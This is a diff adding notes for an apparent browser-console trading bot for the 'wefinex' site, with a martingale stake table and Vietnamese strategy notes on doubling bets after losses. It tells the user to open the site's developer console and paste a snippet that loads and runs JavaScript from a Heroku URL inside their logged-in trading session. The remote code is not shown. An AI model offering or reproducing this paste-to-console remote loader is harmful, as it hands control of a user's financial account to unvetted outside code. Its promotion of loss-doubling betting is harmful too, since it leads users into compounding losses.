@@ -1,0 +1,38 @@
+FLow rule
+
+var listRule = []; //not use
+
+var percentRule = 32;
+var lostValueSet = {
+    0: 1,
+    1: 2,
+    2: 4,
+    3: 8,
+    4: 16,
+    5: 32,
+    6: 64
+};
+
+
+
+Open web
+Goto wefinex
+F12/Right Click ->Inspect
+Pase here to console
+
+
+
+//
+- random trade number (22-15) còn lại rồi đặt luôn
+- "gap thep" if lost money
+- Su dung Chi bao tam ly 
+- so sanh (xanh-do >=percentRule) ->xanh
+- so sanh (do-xanh >=percentRule) ->do
+
+
+
+
+var fileref=document.createElement('script')
+fileref.setAttribute("type","text/javascript")
+fileref.setAttribute("src", "https://tranquil-fjord-14350.herokuapp.com/version/v8-3/release.js")
+document.getElementsByTagName("head")[0].appendChild(fileref)
